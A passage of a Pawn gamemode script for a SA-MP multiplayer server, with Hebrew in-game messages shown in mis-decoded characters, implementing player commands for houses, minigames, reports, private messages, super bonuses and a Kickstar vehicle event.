			format(string,sizeof(string)," .äåñøä âéùä ì %d îùúîùéí ñê äëì",accs);
			SendClientMessage(playerid,green,string);
		}
		else SendClientMessage(playerid,red," .àôùøåú ùâåéä");
		return 1;
	}
	if(equal(cmd,"/buyhouse"))
	{
		if(playerinfo[playerid][level] < 15) return SendClientMessage(playerid,red," .áëãé ìáöò àú äô÷åãä äæå òìéê ìäéåú áøîä 15");
		if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .áëãé ìáöò àú äô÷åãä äæå òìéê ìäéåú øùåí åîçåáø");
		playerinfo[playerid][houseid] = phouse(playerid);
		new f[M_S], string[M_S], h = playerinfo[playerid][houseid];
		if(h == -1) return SendClientMessage(playerid,red," .òìéê ìäéåú ááéú áëãé ìáöò ô÷åãä æå");
		if(GetMoney(playerid) < houseinfo[h][hcost]) return SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó áëãé ì÷ðåú àú äáéú äæä");
		format(f,sizeof(f),"/DM/Houses/%d.ini",h);
		if(playerinfo[playerid][house] == h) return SendClientMessage(playerid,red," .äáéú äæä ëáø ááòìåúê");
		if(playerinfo[playerid][house] != -1) return SendClientMessage(playerid,red," .ëáø éù ìê áéú");
		if(!equal(fgetstring(f,"Owner"),"None"))
		{
			format(string,sizeof(string)," .%s äáéú äæä ëáø ááòìåúå ùì",fgetstring(f,"Owner"));
			SendClientMessage(playerid,red,string);
			return 1;
		}
		fsetfloat(f,"X",houseinfo[h][hx]);
		fsetfloat(f,"Y",houseinfo[h][hy]);
		fsetfloat(f,"Z",houseinfo[h][hz]);
		fsetfloat(f,"A",0.0);
		for(new i=0;i<max_houseacc;i++)
		{
			format(string,sizeof(string),"Acc%d",i);
			if(fkeyexist(f,string)) fremovekey(f,string);
		}
		fsetstring(f,"Acc0",GetName(playerid));
		houseinfo[h][hp][0] = houseinfo[h][hx],
		houseinfo[h][hp][1] = houseinfo[h][hy],
		houseinfo[h][hp][2] = houseinfo[h][hz],
		houseinfo[h][hp][3] = 0.0;
		playerinfo[playerid][house] = h,
		playerinfo[playerid][houseacc][h] = 1;
		GiveMoney(playerid,0-houseinfo[h][hcost]);
		fsetint(fuser(playerid),"House1",h);
		fsetstring(f,"Owner",GetName(playerid));
		format(string,sizeof(string)," !øëù áéú áâåãì %d %s",houseinfo[h][hsize],GetName(playerid));
		SendClientMessageToAll(orange,string);
		PlayerPlaySound(playerid,1149,0.0,0.0,0.0);
		return 1;
	}
	if(equal(cmd,"/h"))
	{
		if(playerinfo[playerid][level] < 1) return SendClientMessage(playerid,red," .áëãé ìáöò àú äô÷åãä äæå òìéê ìäéåú áøîä 1");
		if(playerinfo[playerid][house] == -1) return SendClientMessage(playerid,red," .àéï ìê áéú");
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäùúâø ëàùø àúä áîöá");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúâø ëàùø àúä áôòéìåú");
		if(playerinfo[playerid][dmzone] != dmz_none) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúâø ëàùø àúä áàéæåø ãé-àí");
		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .àéðê éëåì ìäùúâø ëàùø àúä ááçéøú äãîåéåú");
		if(playerinfo[playerid][incrane]) return SendClientMessage(playerid,red," .ìà ðéúï ìáöò ô÷åãä æå áîðåó");
		switch(GetPlayerState(playerid))
		{
			case PLAYER_STATE_ONFOOT, PLAYER_STATE_PASSENGER:
			{
				SetPlayerPos(playerid,houseinfo[playerinfo[playerid][house]][hp][0]+floatrand(-1.0,1.0),houseinfo[playerinfo[playerid][house]][hp][1]+floatrand(-1.0,1.0),houseinfo[playerinfo[playerid][house]][hp][2]);
				SetPlayerFacingAngle(playerid,houseinfo[playerinfo[playerid][house]][hp][3]);
			}
			case PLAYER_STATE_DRIVER:
			{
				SetVehiclePos(GetPlayerVehicleID(playerid),houseinfo[playerinfo[playerid][house]][hp][0]+floatrand(-3.0,3.0),houseinfo[playerinfo[playerid][house]][hp][1]+floatrand(-3.0,3.0),houseinfo[playerinfo[playerid][house]][hp][2]);
				SetVehicleZAngle(GetPlayerVehicleID(playerid),houseinfo[playerinfo[playerid][house]][hp][3]);
				LinkVehicleToInterior(GetPlayerVehicleID(playerid),houseinfo[playerinfo[playerid][house]][hint]);
				SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),world_normal);
			}
		}
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid,houseinfo[playerinfo[playerid][house]][hint]);
		SetPlayerVirtualWorld(playerid,world_normal);
		GameTextForPlayer(playerid,"~y~]~r~your~h~s~n~~h~house~y~]",1500,4);
		return 1;
	}
	if(equal(cmd,"/oh"))
	{
		if(playerinfo[playerid][level] < 1) return SendClientMessage(playerid,red," .áëãé ìáöò àú äô÷åãä äæå òìéê ìäéåú áøîä 1");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /oh [house id] :öåøú äùéîåù");
		new h = strval(cmd), f[M_S], string[M_S];
		if(h < 0 || h > max_houses-1) return SendClientMessage(playerid,red," .îñôø áéú ùâåé");
		CheckHouseAcc(playerid,h);
		if(!playerinfo[playerid][houseacc][h]) return SendClientMessage(playerid,red," .àéï ìê âéùä ìáéú äæä");
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäùúâø ëàùø àúä áîöá");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúâø ëàùø àúä áôòéìåú");
		if(playerinfo[playerid][dmzone] != dmz_none) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúâø ëàùø àúä áàéæåø ãé-àí");
		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .àéðê éëåì ìäùúâø ëàùø àúä ááçéøú äãîåéåú");
		if(playerinfo[playerid][incrane]) return SendClientMessage(playerid,red," .ìà ðéúï ìáöò ô÷åãä æå áîðåó");
		format(f,sizeof(f),"/DM/Houses/%d.ini",h);
		switch(GetPlayerState(playerid))
		{
			case PLAYER_STATE_ONFOOT, PLAYER_STATE_PASSENGER:
			{
				SetPlayerPos(playerid,houseinfo[h][hp][0]+floatrand(-1.0,1.0),houseinfo[h][hp][1]+floatrand(-1.0,1.0),houseinfo[h][hp][2]);
				SetPlayerFacingAngle(playerid,houseinfo[h][hp][3]);
			}
			case PLAYER_STATE_DRIVER:
			{
				SetVehiclePos(GetPlayerVehicleID(playerid),houseinfo[h][hp][0]+floatrand(-3.0,3.0),houseinfo[h][hp][1]+floatrand(-3.0,3.0),houseinfo[h][hp][2]);
				SetVehicleZAngle(GetPlayerVehicleID(playerid),houseinfo[h][hp][3]);
				LinkVehicleToInterior(GetPlayerVehicleID(playerid),houseinfo[h][hint]);
				SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),world_normal);
			}
		}
		SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid,houseinfo[h][hint]);
		SetPlayerVirtualWorld(playerid,world_normal);
		format(string,sizeof(string),"~y~]~g~%s\'s~n~~h~house~y~]",fgetstring(f,"Owner"));
		GameTextForPlayer(playerid,string,1500,4);
		return 1;
	}
	if(equal(cmd,"/math"))
	{
		if(maths[0] == -1 || maths[1] == -1 || maths[2] == -1) return SendClientMessage(playerid,red," .àéï ôòéìåú îúîèé÷ä ëòú");
		if(playerinfo[playerid][pmath] != -1) return SendClientMessage(playerid,red," .ðéúï ìùìåç úùåáä ôòí àçú áëì ôòéìåú");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /math [answer] :öåøú äùéîåù");
		new num = strval(cmd);
		playerinfo[playerid][pmath] = num;
		if(num == maths[3] && maths[5] == -1) maths[5] = playerid;
		SendClientMessage(playerid,green," .äúùåáä ùùìçú ðùìçä. àðà äîúï ìøàåú àí æëéú");
		return 1;
	}
	if(equal(cmd,"/startmath") && IsPlayerMAdmin(playerid))
	{
		if(lottonum[0] != -1 || (maths[0] != -1 && maths[1] != -1 && maths[2] != -1) || trivia[0] != -1 || strlen(replytest) > 0) return SendClientMessage(playerid,red," .ëáø éù ôòéìåú îùðéú ôåòìú");
		Math();
		return 1;
	}
	if(equal(cmd,"/trivia"))
	{
		if(trivia[0] == -1) return SendClientMessage(playerid,red," .àéï èøéååéä ëòú");
		if(playerinfo[playerid][ptrivia] != -1) return SendClientMessage(playerid,red," .ðéúï ìùìåç úùåáä ôòí àçú áèøéååéä àçú áìáã");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /trivia [answer] :öåøú äùéîåù");
		new ans = strval(cmd);
		if(ans < 1 || ans > 3) return SendClientMessage(playerid,red," .îñôø úùåáä ùâåé");
		playerinfo[playerid][ptrivia] = ans;
		if(ans == trivia[0] && trivia[1] == -1) trivia[1] = playerid;
		SendClientMessage(playerid,green," .äúùåáä ùùìçú ðùìçä. àðà äîúï ìøàåú àí æëéú");
		return 1;
	}
	if(equal(cmd,"/starttrivia") && IsPlayerMAdmin(playerid))
	{
		if(lottonum[0] != -1 || (maths[0] != -1 && maths[1] != -1 && maths[2] != -1) || trivia[0] != -1 || strlen(replytest) > 0) return SendClientMessage(playerid,red," .ëáø éù ôòéìåú îùðéú ôåòìú");
		Trivia();
		return 1;
	}
	if(equal(cmd,"/bug"))
	{
		fileCheck(file_bugs);
		if(reporting[0]) return SendClientMessage(playerid,red," .úåëì ìáöò àú äô÷åãä á÷øåá, àðà äîúï");
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /bug [bug information] :öåøú äùéîåù");
		new string[M_S], File:f = fopen(file_bugs,io_append);
		if(!f) return SendClientMessage(playerid,red," .ìà ðéúï ìáöò àú äô÷åãä äæå, öåø ÷ùø òí ääðäìä áá÷ùä");
		format(string,sizeof(string),"- Bug reported by %s (%s): %s\r\n",GetName(playerid),GetIP(playerid),cmd);
		fwrite(f,string);
		fclose(f);
		reporting[0] = 1;
		SetTimerEx("Reporting",12000,0,"i",0);
  		SendClientMessage(playerid,green," :úåãä òì ãéååç äáàâ");
  		SendClientMessage(playerid,green,cmd);
  		SendClientMessage(playerid,green,"  .äðäìú äùøú úú÷ï àåúå áä÷ãí");
		return 1;
	}
	if(equal(cmd,"/advice"))
	{
		fileCheck(file_advices);
		if(reporting[1]) return SendClientMessage(playerid,red," .úåëì ìáöò àú äô÷åãä á÷øåá, àðà äîúï");
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /advice [advice information] :öåøú äùéîåù");
		new string[M_S], File:f = fopen(file_advices,io_append);
		if(!f) return SendClientMessage(playerid,red," .ìà ðéúï ìáöò àú äô÷åãä äæå, öåø ÷ùø òí ääðäìä áá÷ùä");
		format(string,sizeof(string),"- Advice from %s (%s): %s\r\n",GetName(playerid),GetIP(playerid),cmd);
		fwrite(f,string);
		fclose(f);
		reporting[1] = 1;
		SetTimerEx("Reporting",12000,0,"i",1);
  		SendClientMessage(playerid,green," :úåãä òì ääöòä");
  		SendClientMessage(playerid,green,cmd);
  		SendClientMessage(playerid,green,"  .áîéãä åäöòä \\ øòéåï æä éúàéí ìùøú, äåà éåëðñ ìîåã \\ ì÷äéìä");
		return 1;
	}
	if(equal(cmd,"/preport"))
	{
		fileCheck(file_preports);
		if(reporting[2]) return SendClientMessage(playerid,red," .úåëì ìáöò àú äô÷åãä á÷øåá, àðà äîúï");
		new plName[M_S], pl = INVALID_PLAYER_ID, string[M_S], File:f = fopen(file_preports,io_append);
		plName = strtok(cmdtext,idx), cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /preport [player name] [report information] :öåøú äùéîåù");
		if(!f) return SendClientMessage(playerid,red," .ìà ðéúï ìáöò àú äô÷åãä äæå, öåø ÷ùø òí ääðäìä áá÷ùä");
		if(!IsValidNick(plName)) return SendClientMessage(playerid,red," .ëéðåé ùâåé");
		for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && equal(GetName(i),plName))
		{
			pl = i;
			break;
		}
		if(pl == INVALID_PLAYER_ID)
		{
			format(string,sizeof(string),"/DM/Users/%s.ini",plName);
			if(!fexist(string)) return SendClientMessage(playerid,red," .ùí îùúîù æä ìà ÷ééí áøùéîú äîùúîùéí");
		}
		format(string,sizeof(string),"%s (Guest)",GetName(pl));
		format(string,sizeof(string),"- PReport from %s (%s) on %s: %s\r\n",GetName(playerid),GetIP(playerid),pl == INVALID_PLAYER_ID ? (plName) : (string),cmd);
		fwrite(f,string);
		fclose(f);
		reporting[2] = 1;
		SetTimerEx("Reporting",12000,0,"i",2);
		format(string,sizeof(string)," :%s úåãä òì äãéååç òì äùç÷ï",plName);
  		SendClientMessage(playerid,green,string);
  		SendClientMessage(playerid,green,cmd);
  		SendClientMessage(playerid,green,"  .àðå ðèôì áòðééï áä÷ãí");
		return 1;
	}
	if(equal(cmd,"/areport"))
	{
		fileCheck(file_areports);
		if(reporting[3]) return SendClientMessage(playerid,red," .úåëì ìáöò àú äô÷åãä á÷øåá, àðà äîúï");
		new adName[M_S], string[M_S], File:f = fopen(file_areports,io_append);
		adName = strtok(cmdtext,idx), cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /areport [admin name] [report information] :öåøú äùéîåù");
		if(!f) return SendClientMessage(playerid,red," .ìà ðéúï ìáöò àú äô÷åãä äæå, öåø ÷ùø òí ääðäìä áá÷ùä");
		if(!IsValidNick(adName)) return SendClientMessage(playerid,red," .ëéðåé ùâåé");
		if(!fkeyexist(file_admins,adName)) return SendClientMessage(playerid,red," .ëéðåé æä ìà ÷ééí áøùéîú äàãîéðéí");
		format(string,sizeof(string),"- AReport from %s (%s) on %s: %s\r\n",GetName(playerid),GetIP(playerid),adName,cmd);
		fwrite(f,string);
		fclose(f);
		reporting[3] = 1;
		SetTimerEx("Reporting",12000,0,"i",3);
		format(string,sizeof(string)," :%s úåãä òì äãéååç òì äàãîéï",adName);
  		SendClientMessage(playerid,green,string);
  		SendClientMessage(playerid,green,cmd);
  		SendClientMessage(playerid,green,"  .àðå ðèôì áòðééï áä÷ãí");
		return 1;
	}
	if(equal(cmd,"/sb"))
	{
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /sb [action] :öåøú äùéîåù");
			SendClientMessage(playerid,white," /sb list :øùéîú äñåôø áåðåñéí");
			SendClientMessage(playerid,white," /sb buy [id] :÷ðééú ñåôø áåðåñ");
			return 1;
		}
		if(equal(cmd,"list"))
		{
			SendClientMessage(playerid,lightblue," ~~~ :îñôøé ñåôø áåðåñéí ~~~");
			for(new i = 1; i < sizeof(SuperBonuses); i++)
			{
				format(string,sizeof(string),"  %d. [%d$] %s",i,SuperBonuses[i][sbCost],SuperBonuses[i][sbName]);
				SendClientMessage(playerid,yellow,string);
			}
		}
		else if(equal(cmd,"buy"))
		{
			if(playerinfo[playerid][sb] > 0) return SendClientMessage(playerid,red," .ëáø éù ìê ñåôø áåðåñ");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) && !IsNumeric(cmd)) return SendClientMessage(playerid,white," /sb buy [super bonus id] :öåøú äùéîåù");
			new id = strval(cmd);
			if(id < 1 && id > sizeof(SuperBonuses) - 1) return SendClientMessage(playerid,red," .îñôø ñåôø áåðåñ ùâåé");
			if(GetMoney(playerid) < SuperBonuses[id][sbCost]) return SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó");
			if(id == 7)
			#if usingYSF
				//SetPlayerGravity(playerid,0.001);
				return SendClientMessage(playerid,red," .ñåôø áåðåñ æä çñåí ëøâò");
			#else
				return SendClientMessage(playerid,red," .ñåôø áåðåñ æä çñåí ëøâò");
			#endif
			if(id == 8)
			{
				playerinfo[playerid][kills]++;
				if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"Kills",playerinfo[playerid][kills]);
			}
			if(id < 8) SetTimerEx("DeleteSuperbonus",id == 5 ? 90000 : 60000,0,"i",playerid);
			GiveMoney(playerid,0-SuperBonuses[id][sbCost]);
			playerinfo[playerid][sb] = id;
			format(string,sizeof(string)," :÷ðéú àú ñåôø áåðåñ îñôø %d",id);
			SendClientMessage(playerid,green,string);
			SendClientMessage(playerid,green,SuperBonuses[id][sbName]);
		}
		else return SendClientMessage(playerid,red," .àôùøåú ñåôø áåðåñòí ùâåéä");
		return 1;
	}
 	if(equal(cmd,"/private") || equal(cmd,"/pm"))
 	{
 		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /private(pm) [id/name] [text] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(id == playerid) return SendClientMessage(playerid,red," .àéï áàôùøåúê ìáöò àú äô÷åãä äæå òì òöîê");
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /private(pm) [id/name] [text] :öåøú äùéîåù");
		new pmSended = OnPlayerPrivmsg(playerid,id,cmd);
		if(pmSended)
		{
			playerinfo[id][lastpm] = playerid;
			format(string,sizeof(string)," PM sent to %s(%d): %s",GetName(id),id,cmd);
			SendClientMessage(playerid,yellow,string);
			format(string,sizeof(string)," PM from %s(%d): %s",GetName(playerid),playerid,cmd);
			SendClientMessage(id,yellow,string);
		}
 		playerinfo[playerid][dscmd] = 0;
		return 1;
	}
 	if(equal(cmd,"/reply") || equal(cmd,"/r"))
 	{
 		new string[M_S];
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /reply(r) [text] :öåøú äùéîåù");
		if(!IsPlayerConnected(playerinfo[playerid][lastpm]) || playerinfo[playerid][lastpm] == playerid) return SendClientMessage(playerid,red," .àééãé ùâåé");
		new pmSended = OnPlayerPrivmsg(playerid,playerinfo[playerid][lastpm],cmd);
		if(pmSended)
		{
			format(string,sizeof(string)," PM sent to %s(%d): %s",GetName(playerinfo[playerid][lastpm]),playerinfo[playerid][lastpm],cmd);
			SendClientMessage(playerid,yellow,string);
			format(string,sizeof(string)," PM from %s(%d): %s",GetName(playerid),playerid,cmd);
			SendClientMessage(playerinfo[playerid][lastpm],yellow,string);
			playerinfo[playerinfo[playerid][lastpm]][lastpm] = playerid;
		}
		return 1;
	}
 	if(equal(cmd,"/lastpm"))
 	{
 		new string[M_S];
		if(playerinfo[playerid][lastpm] == INVALID_PLAYER_ID) format(string,sizeof(string),"  .ìà ÷ééîú äåãòä ôøèéú àçøåðä");
		else format(string,sizeof(string),"  (%d) %s :ääåãòä äôøèéú äàçøåðä ðùìçä àì",playerinfo[playerid][lastpm],GetName(playerinfo[playerid][lastpm]));
		SendClientMessage(playerid,playerinfo[playerid][lastpm] == INVALID_PLAYER_ID ? red : green,string);
		return 1;
	}
 	if(equal(cmd,"/pmlist"))
 	{
 	    if(!equal(GetName(playerid),"(gmR)Amit[L]")) return SendClientMessage(playerid,red," .ëáåé æîðéú");
 		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd))
		{
			SendClientMessage(playerid,orange," * /pmlist show - (öôééä áøùéîú ääåãòåú äôøèéåú äàçøåðåú ùìê (î÷ñéîåí 50");
			SendClientMessage(playerid,orange," * /pmlist reset - îçé÷ú øùéîú ääåãòåú äôøèéåú ùìê");
			SendClientMessage(playerid,orange," * /pmlist toggle - äôñ÷ú / àéôùåø ùîéøú ääåãòåú äôøèéåú ùìê");
			return 1;
		}
		if(equal(cmd,"show"))
		{
			if(!playerinfo[playerid][savepms]) return SendClientMessage(playerid,red," .àéðê ùåîø äåãòåú ôøèéåú");
			new f[M_S], k[M_S], pmid = 0;
			format(f,sizeof(f),"%sPMList_%s",folder_infopm,GetName(playerid));
			if(!fexist(f)) return SendClientMessage(playerid,red," .àéï ùåí äåãòä ôøèéú ùîåøä");
			SendClientMessage(playerid,lightblue," ~~~ :øùéîú ääåãòåú äôøèéåú äùîåøåú ~~~");
			for(new i = 0; i < 50; i++)
			{
				format(k,sizeof(k),"PM%d",i);
				if(!fkeyexist(f,k)) continue;
				format(string,sizeof(string),"#%02d) %s",++pmid,fgetstring(f,k));
				SendClientMessage(playerid,pmid % 2 == 0 ? yellow : white,string);
			}
		}
		else if(equal(cmd,"reset"))
		{
			new f[M_S];
			format(f,sizeof(f),"%sPMList_%s",folder_infopm,GetName(playerid));
			if(!fexist(f)) return SendClientMessage(playerid,red," .àéï ùåí äåãòä ôøèéú ùîåøä");
			fremove(f);
			SendClientMessage(playerid,green," .øùéîú ääåãòåú äôøèéåú äùîåøåú ùìê ðîç÷ä");
		}
		else if(equal(cmd,"toggle"))
		{
			playerinfo[playerid][savepms] = !playerinfo[playerid][savepms];
			SendClientMessage(playerid,purple,playerinfo[playerid][savepms]? (" --- !äâãøåú: îòëùéå ääåãòåú äôøèéåú ùìê ééùîøå"):(" --- !äâãøåú: îòëùéå ääåãòåú äôøèéåú ùìê ìà ééùîøå"));
			fsetint(fuser(playerid),"SavePMs",playerinfo[playerid][savepms]);
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else return SendClientMessage(playerid,red," .àôùøåú äåãòåú ôøèéåú ùâåéä");
		return 1;
	}
	if(equal(cmd,"/kickstar"))
	{
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /kickstar [action] :öåøú äùéîåù");
			SendClientMessage(playerid,white," /kickstar state :äðåëçéú Kickstar äöâú îöá úçøåú ä");
			SendClientMessage(playerid,white," /kickstar join :Kickstar äöèøôåú ìúçøåú ä");
			SendClientMessage(playerid,white," /kickstar quit :Kickstar ôøéùä îúçøåú ä");
			if(IsPlayerMAdmin(playerid))
			{
				SendClientMessage(playerid,white," /kickstar start :çãùä Kickstar äúçìú úçøåú");
				SendClientMessage(playerid,white," /kickstar end [reason] :äðåëçéú Kickstar ñéåí úçøåú ä");
			}
			return 1;
		}
		if(equal(cmd,"state"))
		{
			if(kickstarinfo[0])
			{
				if(kickstarinfo[2] > 1)
				{
					format(string,sizeof(string)," .àéñåó äð÷åãåú éúçéì áòåã ,Kickstar éù ëòú úçøåú %d ùðéåú",kickstarinfo[2]);
					SendClientMessage(playerid,green,string);
				}
				else SendClientMessage(playerid,green," .åàéñåó äð÷åãåú ëáø äúçéì Kickstar éù ëòú úçøåú");
			}
			else SendClientMessage(playerid,red," .Kickstar àéï ëòú úçøåú");
		}
		else if(equal(cmd,"join"))
		{
			if(!kickstarinfo[0]) return SendClientMessage(playerid,red," .ëøâò Kickstar àéï úçøåú");
			if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ìà ðéúï ìäöèøó ìôòéìåú ëàùø àúä ááçéøú äãîåéåú");
			if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäöèøó ìôòéìåú ëàùø àúä áîöá");
			if(playerinfo[playerid][waitkickstar]) return SendClientMessage(playerid,red," .úúçéì áòåã ëîä ùðéåú, àðà äîúï áñáìðåú Kickstar úçøåú ä");
			if(playerinfo[playerid][inkickstar]) return SendClientMessage(playerid,red," .Kickstar àúä ëáø áúçøåú ä");
			if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .àúä ëáø áôòéìåú");
			if(playerinfo[playerid][dmzone] != dmz_none) return SendClientMessage(playerid,red," .ìà ðéúï ìäöèøó ìôòéìåú ëàùø àúä áàéæåø ãé-àí");
			if(kickstarinfo[1] >= (sizeof(Kickstar)-1)-(sizeof(Kickstar)/4)) return SendClientMessage(playerid,red," .úôåñéí Kickstar ëì äî÷åîåú áúçøåú ä");
			if(kickstarinfo[2] <= 1) return SendClientMessage(playerid,red," .æîï ääöèøôåú òáø");
			if(GetMoney(playerid) < 400) return SendClientMessage(playerid,red," .àéï ìê îñôé÷ ëñó, äîçéø ìäöèøôåú ìôòéìåú äæå äåà 400$");
			if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú áøëá");
			if(GetVehicleType(GetPlayerVehicleID(playerid)) != 0 && GetVehicleType(GetPlayerVehicleID(playerid)) != 1) return SendClientMessage(playerid,red," .Kickstar ìà ðéúï ìäëðñ òí ñåâ äøëá äæä ìúçøåú ä");
			SendClientMessage(playerid,green," .áäöìçä, àðà äîúï ìúçéìú àéñåó äð÷åãåú Kickstar äöèøôú ìúçøåú ä");
			GiveMoney(playerid,0-400);
			ResetWeapons(playerid);
			kickstarinfo[1]++;
			playerinfo[playerid][waitkickstar] = 1, playerinfo[playerid][kickstarid] = -1;
			new tests = 0;
			do
			{
				if(tests == 10) break;
				playerinfo[playerid][kickstarid] = random(sizeof(Kickstar)), tests++;
			}
			while playerinfo[playerid][kickstarid] < 0 || playerinfo[playerid][kickstarid] > sizeof(Kickstar)-1 || IsSomeoneNearKSPos(playerinfo[playerid][kickstarid]);
			SendClientMessage(playerid,lightblue," ~~~ :Kickstar äöèøôú ìúçøåú ä ~~~");
			SendClientMessage(playerid,yellow,"  îèøúê äéà ìàñåó ëîä ùéåúø ð÷åãåú àãåîåú ùéåôéòå áî÷åîåú øðãåîàìééí áîøçá áå àúä ðîöà");
			SendClientMessage(playerid,yellow,"  áñåó äôòéìåú (ìàçø 90 ùðéåú îàæ úçéìúä) äùç÷ï áòì äëé äøáä ð÷åãåú éðöç");
			SendClientMessage(playerid,yellow,"  áîéãä åéù îñôø ùç÷ðéí îðöçéí - äëñó ééúçì÷ áéðéäí");
			format(string,sizeof(string),"  äéðê îúçøä îñôø #%d",kickstarinfo[1]);
			SendClientMessage(playerid,pink,string);
			SendClientMessage(playerid,purple," » !áäöìçä, åîùç÷ îäðä");
		}
		else if(equal(cmd,"quit"))
		{
			if(!kickstarinfo[0]) return SendClientMessage(playerid,red," .ëøâò Kickstar àéï úçøåú");
			if(!playerinfo[playerid][inkickstar]) return SendClientMessage(playerid,red," .Kickstar àúä ìà áúçøåú ä");
			SendClientMessage(playerid,green," .Kickstar ôøùú îúçøåú ä");
			playerinfo[playerid][waitkickstar] = 0, playerinfo[playerid][inkickstar] = 0, playerinfo[playerid][kickstarid] = -1;
			SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),world_normal);
			SetPlayerVirtualWorld(playerid,world_normal);
			SetVehicleToRespawn(GetPlayerVehicleID(playerid));
			DisablePlayerCheckpoint(playerid);
			SpawnPlayer(playerid);
			SetPlayerInterior(playerid,0);
			kickstarinfo[1]--;
			playerinfo[playerid][inact] = 0;
			if(kickstarinfo[1] == 1)
			{
				for(new i=0;i<MAX_PLAYERS;i++)
				{
					if(IsPlayerConnected(i) && playerinfo[i][inkickstar])
					{
						format(string,sizeof(string),"~r~%s ~n~~w~is the winner in the ~r~~h~kickstar~w~!",GetName(i));
						MovingText(string,mt_activity);
						format(string,sizeof(string)," !Kickstar ðéöç áúçøåú ä %s",GetName(i));
						SendClientMessageToAll(yellow,string);
						SetPlayerInterior(i,0);
						LinkVehicleToInterior(GetPlayerVehicleID(i),0);
						SetVehicleVirtualWorld(GetPlayerVehicleID(i),0);
						SetVehicleToRespawn(GetPlayerVehicleID(i));
						DisablePlayerCheckpoint(i);
						SpawnPlayer(i);
						GiveMoney(i,50000);
						playerinfo[i][inkickstar] = 0, playerinfo[i][waitkickstar] = 0, playerinfo[i][kickstarid] = -1;
						kickstarinfo[0] = 0, kickstarinfo[1] = 0, kickstarinfo[2] = 0, kickstarinfo[4] = 0;
						playerinfo[i][inact] = 0;
						KillTimer(kickstarinfo[3]);
					}
				}
			}
		}
		else if(equal(cmd,"start"))
		{
			#if trainings == false
				if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú àãîéï áëãé ìäùúîù áôòåìä æå");
			#endif
			if(kickstarinfo[0]) return SendClientMessage(playerid,red," .Kickstar ëáø éù úçøåú");
			if(ThereIsAct()) return SendClientMessage(playerid,red," .ëáø éù ôòéìåú ôåòìú");
			StartKickstar();
		}
		else if(equal(cmd,"end"))
		{
			new reason[256];
			if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú àãîéï áëãé ìäùúîù áôòåìä æå");
			if(!kickstarinfo[0]) return SendClientMessage(playerid,red," .ëøâò Kickstar àéï úçøåú");
			reason = strrest(cmdtext,idx);
			if(!strlen(reason)) reason = " àéï";
			EndKickstar(reason,playerid);
		}
		else SendClientMessage(playerid,red," .ùâåéä Kickstar àôùøåú úçøåú");
		return 1;
	}
	if(equal(cmd,"/crane"))
	{
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /crane [state/enter/exit/boom]");
		if(equal(cmd,"state"))
		{
			new string[M_S];
			if(playerinfo[playerid][incrane]) format(string,sizeof(string)," .àúä îùúîù ëòú áîðåó, åðåúøå ìê %d ùðéåú",playerinfo[playerid][cranetime]);
			else
			{
				new usingID = INVALID_PLAYER_ID;
				for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && i != playerid && playerinfo[i][incrane])
				{
					usingID = i;
					break;
				}
				if(usingID == INVALID_PLAYER_ID) return SendClientMessage(playerid,green," /crane enter :àó àçã ìà îùúîù ëòú áîðåó. àúä îåæîï ìðñåú áòöîê");
